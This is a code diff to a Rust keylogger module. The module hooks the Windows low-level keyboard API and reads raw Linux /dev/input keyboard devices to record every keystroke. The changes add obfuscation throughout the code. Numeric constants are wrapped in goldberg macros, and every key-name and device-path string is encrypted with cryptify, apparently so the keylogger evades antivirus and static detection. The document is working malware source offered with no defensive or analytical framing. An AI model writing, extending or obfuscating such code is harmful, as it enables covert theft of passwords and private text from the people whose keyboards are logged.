@@ -23,8 +23,8 @@ pub fn stop() {
     #[cfg(target_os = "windows")]
     unsafe {
         let tid = THREAD_ID.load(Ordering::SeqCst);
-        if tid != 0 {
-            winapi::um::winuser::PostThreadMessageA(tid, winapi::um::winuser::WM_QUIT, 0, 0);
+        if tid != goldberg::goldberg_int!(0) {
+            winapi::um::winuser::PostThreadMessageA(tid, winapi::um::winuser::WM_QUIT, goldberg::goldberg_int!(0), goldberg::goldberg_int!(0));
         }
     }
 }
@@ -68,7 +68,7 @@ fn keylogger_thread_windows() {
         let hmod = GetModuleHandleA(std::ptr::null_mut());
         THREAD_ID.store(GetCurrentThreadId(), Ordering::SeqCst);
 
-        let hook = SetWindowsHookExA(WH_KEYBOARD_LL, Some(hook_callback), hmod, 0);
+        let hook = SetWindowsHookExA(WH_KEYBOARD_LL, Some(hook_callback), hmod, goldberg::goldberg_int!(0));
 
         if hook.is_null() {
             RUNNING.store(false, Ordering::SeqCst);
@@ -76,7 +76,7 @@ fn keylogger_thread_windows() {
         }
 
         let mut msg = std::mem::zeroed::<MSG>();
-        while GetMessageA(&mut msg, std::ptr::null_mut(), 0, 0) != 0 {
+        while GetMessageA(&mut msg, std::ptr::null_mut(), goldberg::goldberg_int!(0), goldberg::goldberg_int!(0)) != goldberg::goldberg_int!(0) {
             TranslateMessage(&mut msg);
             DispatchMessageA(&mut msg);
         }
@@ -94,7 +94,7 @@ unsafe extern "system" fn hook_callback(
 ) -> winapi::shared::minwindef::LRESULT {
     use winapi::um::winuser::*;
 
-    if code >= 0 && RUNNING.load(Ordering::SeqCst) {
+    if code >= goldberg::goldberg_int!(0) && RUNNING.load(Ordering::SeqCst) {
         if wparam as u32 == WM_KEYDOWN || wparam as u32 == WM_SYSKEYDOWN {
             let kb = unsafe { *(lparam as *const KBDLLHOOKSTRUCT) };
             unsafe { handle_key_windows(kb.vkCode as u32); }
@@ -107,8 +107,8 @@ unsafe extern "system" fn hook_callback(
 unsafe fn handle_key_windows(vk: u32) {
     use winapi::um::winuser::*;
 
-    let shift = unsafe { GetAsyncKeyState(VK_SHIFT) & -32768i16 != 0 };
-    let caps = unsafe { GetKeyState(VK_CAPITAL) & 0x01 != 0 };
+    let shift = unsafe { GetAsyncKeyState(VK_SHIFT) & -32768i16 != goldberg::goldberg_int!(0) };
+    let caps = unsafe { GetKeyState(VK_CAPITAL) & goldberg::goldberg_int!(0x01) != goldberg::goldberg_int!(0) };
 
     match vk {
         0x41..=0x5A => {
@@ -132,43 +132,43 @@ unsafe fn handle_key_windows(vk: u32) {
         0x20 => append_char(' '),
         0x0D => append_char('\n'),
         0x09 => append_char('\t'),
-        0x08 => append("[BS]"),
-        0x2E => append("[DEL]"),
-        0x1B => append("[ESC]"),
-        0x25 => append("[LEFT]"),
-        0x27 => append("[RIGHT]"),
-        0x26 => append("[UP]"),
-        0x28 => append("[DOWN]"),
-        0x24 => append("[HOME]"),
-        0x23 => append("[END]"),
-        0x21 => append("[PGUP]"),
-        0x22 => append("[PGDN]"),
-        0x5B => append("[WIN]"),
-        0x5C => append("[RWIN]"),
+        0x08 => append(&cryptify::encrypt_string!("[BS]")),
+        0x2E => append(&cryptify::encrypt_string!("[DEL]")),
+        0x1B => append(&cryptify::encrypt_string!("[ESC]")),
+        0x25 => append(&cryptify::encrypt_string!("[LEFT]")),
+        0x27 => append(&cryptify::encrypt_string!("[RIGHT]")),
+        0x26 => append(&cryptify::encrypt_string!("[UP]")),
+        0x28 => append(&cryptify::encrypt_string!("[DOWN]")),
+        0x24 => append(&cryptify::encrypt_string!("[HOME]")),
+        0x23 => append(&cryptify::encrypt_string!("[END]")),
+        0x21 => append(&cryptify::encrypt_string!("[PGUP]")),
+        0x22 => append(&cryptify::encrypt_string!("[PGDN]")),
+        0x5B => append(&cryptify::encrypt_string!("[WIN]")),
+        0x5C => append(&cryptify::encrypt_string!("[RWIN]")),
         0x10 | 0x11 | 0x12 | 0x14 | 0xA0 | 0xA1 | 0xA2 | 0xA3 | 0xA4 | 0xA5 => {}
-        0xBA => append(if shift { ":" } else { ";" }),
-        0xBB => append(if shift { "+" } else { "=" }),
-        0xBC => append(if shift { "<" } else { "," }),
-        0xBD => append(if shift { "_" } else { "-" }),
-        0xBE => append(if shift { ">" } else { "." }),
-        0xBF => append(if shift { "?" } else { "/" }),
-        0xC0 => append(if shift { "~" } else { "`" }),
-        0xDB => append(if shift { "{" } else { "[" }),
-        0xDC => append(if shift { "|" } else { "\\" }),
-        0xDD => append(if shift { "}" } else { "]" }),
-        0xDE => append(if shift { "\"" } else { "'" }),
-        0x70 => append("[F1]"),
-        0x71 => append("[F2]"),
-        0x72 => append("[F3]"),
-        0x73 => append("[F4]"),
-        0x74 => append("[F5]"),
-        0x75 => append("[F6]"),
-        0x76 => append("[F7]"),
-        0x77 => append("[F8]"),
-        0x78 => append("[F9]"),
-        0x79 => append("[F10]"),
-        0x7A => append("[F11]"),
-        0x7B => append("[F12]"),
+        0xBA => append(if shift { cryptify::encrypt_string!(":") } else { cryptify::encrypt_string!(";") }),
+        0xBB => append(if shift { cryptify::encrypt_string!("+") } else { cryptify::encrypt_string!("=") }),
+        0xBC => append(if shift { cryptify::encrypt_string!("<") } else { cryptify::encrypt_string!(",") }),
+        0xBD => append(if shift { cryptify::encrypt_string!("_") } else { cryptify::encrypt_string!("-") }),
+        0xBE => append(if shift { cryptify::encrypt_string!(">") } else { cryptify::encrypt_string!(".") }),
+        0xBF => append(if shift { cryptify::encrypt_string!("?") } else { cryptify::encrypt_string!("/") }),
+        0xC0 => append(if shift { cryptify::encrypt_string!("~") } else { cryptify::encrypt_string!("`") }),
+        0xDB => append(if shift { cryptify::encrypt_string!("{") } else { cryptify::encrypt_string!("[") }),
+        0xDC => append(if shift { cryptify::encrypt_string!("|") } else { cryptify::encrypt_string!("\\") }),
+        0xDD => append(if shift { cryptify::encrypt_string!("}") } else { cryptify::encrypt_string!("]") }),
+        0xDE => append(if shift { cryptify::encrypt_string!("\"") } else { cryptify::encrypt_string!("'") }),
+        0x70 => append(&cryptify::encrypt_string!("[F1]")),
+        0x71 => append(&cryptify::encrypt_string!("[F2]")),
+        0x72 => append(&cryptify::encrypt_string!("[F3]")),
+        0x73 => append(&cryptify::encrypt_string!("[F4]")),
+        0x74 => append(&cryptify::encrypt_string!("[F5]")),
+        0x75 => append(&cryptify::encrypt_string!("[F6]")),
+        0x76 => append(&cryptify::encrypt_string!("[F7]")),
+        0x77 => append(&cryptify::encrypt_string!("[F8]")),
+        0x78 => append(&cryptify::encrypt_string!("[F9]")),
+        0x79 => append(&cryptify::encrypt_string!("[F10]")),
+        0x7A => append(&cryptify::encrypt_string!("[F11]")),
+        0x7B => append(&cryptify::encrypt_string!("[F12]")),
         _ => {}
     }
 }
@@ -183,10 +183,10 @@ fn keylogger_thread_linux() {
 
     fn find_keyboards() -> Vec<String> {
         let mut devices = Vec::new();
-        if let Ok(entries) = fs::read_dir("/dev/input/by-path") {
+        if let Ok(entries) = fs::read_dir(cryptify::encrypt_string!("/dev/input/by-path")) {
             for entry in entries.flatten() {
                 let name = entry.file_name().to_string_lossy().to_string();
-                if name.contains("-kbd") || name.contains("-event-kbd") {
+                if name.contains(&cryptify::encrypt_string!("-kbd")) || name.contains(&cryptify::encrypt_string!("-event-kbd")) {
                     if let Ok(path) = fs::canonicalize(entry.path()) {
                         devices.push(path.to_string_lossy().to_string());
                     }
@@ -194,10 +194,10 @@ fn keylogger_thread_linux() {
             }
         }
         if devices.is_empty() {
-            if let Ok(entries) = fs::read_dir("/dev/input") {
+            if let Ok(entries) = fs::read_dir(cryptify::encrypt_string!("/dev/input")) {
                 for entry in entries.flatten() {
                     let name = entry.file_name().to_string_lossy().to_string();
-                    if name.starts_with("event") {
+                    if name.starts_with(&cryptify::encrypt_string!("event")) {
                         devices.push(entry.path().to_string_lossy().to_string());
                     }
                 }
@@ -217,7 +217,7 @@ fn keylogger_thread_linux() {
         if let Ok(f) = File::open(dev) {
             let fd = f.as_raw_fd();
             unsafe {
-                let flags = libc::fcntl(fd, libc::F_GETFL, 0);
+                let flags = libc::fcntl(fd, libc::F_GETFL, goldberg::goldberg_int!(0));
                 libc::fcntl(fd, libc::F_SETFL, flags | libc::O_NONBLOCK);
             }
             files.push(f);
@@ -229,16 +229,16 @@ fn keylogger_thread_linux() {
         return;
     }
 
-    let mut buf = [0u8; 24];
+    let mut buf = [0u8; goldberg::goldberg_int!(24)];
     while RUNNING.load(Ordering::SeqCst) {
-        for f in &files {
+        for f in &mut files {
             loop {
                 match f.read(&mut buf) {
-                    Ok(24) => {
-                        let type_ = u16::from_ne_bytes([buf[16], buf[17]]);
-                        let code = u16::from_ne_bytes([buf[18], buf[19]]);
-                        let value = u32::from_ne_bytes([buf[20], buf[21], buf[22], buf[23]]);
-                        if type_ == 1 && value == 1 {
+                    Ok(goldberg::goldberg_int!(24)) => {
+                        let type_ = u16::from_ne_bytes([buf[goldberg::goldberg_int!(16)], buf[goldberg::goldberg_int!(17)]]);
+                        let code = u16::from_ne_bytes([buf[goldberg::goldberg_int!(18)], buf[goldberg::goldberg_int!(19)]]);
+                        let value = u32::from_ne_bytes([buf[goldberg::goldberg_int!(20)], buf[goldberg::goldberg_int!(21)], buf[goldberg::goldberg_int!(22)], buf[goldberg::goldberg_int!(23)]]);
+                        if type_ == goldberg::goldberg_int!(1) && value == goldberg::goldberg_int!(1) {
                             handle_key_linux(code);
                         }
                     }
@@ -248,14 +248,14 @@ fn keylogger_thread_linux() {
                 }
             }
         }
-        std::thread::sleep(std::time::Duration::from_millis(10));
+        std::thread::sleep(std::time::Duration::from_millis(goldberg::goldberg_int!(10)));
     }
 }
 
 #[cfg(target_os = "linux")]
 fn handle_key_linux(code: u16) {
     match code {
-        1 => append("[ESC]"),
+        1 => append(&cryptify::encrypt_string!("[ESC]")),
         2 => append_char('1'),
         3 => append_char('2'),
         4 => append_char('3'),
@@ -268,7 +268,7 @@ fn handle_key_linux(code: u16) {
         11 => append_char('0'),
         12 => append_char('-'),
         13 => append_char('='),
-        14 => append("[BS]"),
+        14 => append(&cryptify::encrypt_string!("[BS]")),
         15 => append_char('\t'),
         16 => append_char('q'),
         17 => append_char('w'),
@@ -308,36 +308,36 @@ fn handle_key_linux(code: u16) {
         53 => append_char('/'),
         55 => append_char('*'),
         57 => append_char(' '),
-        58 => append("[CAPS]"),
-        59 => append("[F1]"),
-        60 => append("[F2]"),
-        61 => append("[F3]"),
-        62 => append("[F4]"),
-        63 => append("[F5]"),
-        64 => append("[F6]"),
-        65 => append("[F7]"),
-        66 => append("[F8]"),
-        67 => append("[F9]"),
-        68 => append("[F10]"),
-        69 => append("[NUMLK]"),
-        70 => append("[SCRLK]"),
-        71 => append("[HOME]"),
-        72 => append("[UP]"),
-        73 => append("[PGUP]"),
-        75 => append("[LEFT]"),
-        77 => append("[RIGHT]"),
-        79 => append("[END]"),
-        80 => append("[DOWN]"),
-        81 => append("[PGDN]"),
-        82 => append("[INS]"),
-        83 => append("[DEL]"),
-        87 => append("[F11]"),
-        88 => append("[F12]"),
+        58 => append(&cryptify::encrypt_string!("[CAPS]")),
+        59 => append(&cryptify::encrypt_string!("[F1]")),
+        60 => append(&cryptify::encrypt_string!("[F2]")),
+        61 => append(&cryptify::encrypt_string!("[F3]")),
+        62 => append(&cryptify::encrypt_string!("[F4]")),
+        63 => append(&cryptify::encrypt_string!("[F5]")),
+        64 => append(&cryptify::encrypt_string!("[F6]")),
+        65 => append(&cryptify::encrypt_string!("[F7]")),
+        66 => append(&cryptify::encrypt_string!("[F8]")),
+        67 => append(&cryptify::encrypt_string!("[F9]")),
+        68 => append(&cryptify::encrypt_string!("[F10]")),
+        69 => append(&cryptify::encrypt_string!("[NUMLK]")),
+        70 => append(&cryptify::encrypt_string!("[SCRLK]")),
+        71 => append(&cryptify::encrypt_string!("[HOME]")),
+        72 => append(&cryptify::encrypt_string!("[UP]")),
+        73 => append(&cryptify::encrypt_string!("[PGUP]")),
+        75 => append(&cryptify::encrypt_string!("[LEFT]")),
+        77 => append(&cryptify::encrypt_string!("[RIGHT]")),
+        79 => append(&cryptify::encrypt_string!("[END]")),
+        80 => append(&cryptify::encrypt_string!("[DOWN]")),
+        81 => append(&cryptify::encrypt_string!("[PGDN]")),
+        82 => append(&cryptify::encrypt_string!("[INS]")),
+        83 => append(&cryptify::encrypt_string!("[DEL]")),
+        87 => append(&cryptify::encrypt_string!("[F11]")),
+        88 => append(&cryptify::encrypt_string!("[F12]")),
         96 => append_char('\n'),
-        110 => append("[INS]"),
-        111 => append("[DEL]"),
-        119 => append("[PAUSE]"),
-        125 => append("[WIN]"),
+        110 => append(&cryptify::encrypt_string!("[INS]")),
+        111 => append(&cryptify::encrypt_string!("[DEL]")),
+        119 => append(&cryptify::encrypt_string!("[PAUSE]")),
+        125 => append(&cryptify::encrypt_string!("[WIN]")),
         _ => {}
     }
 }
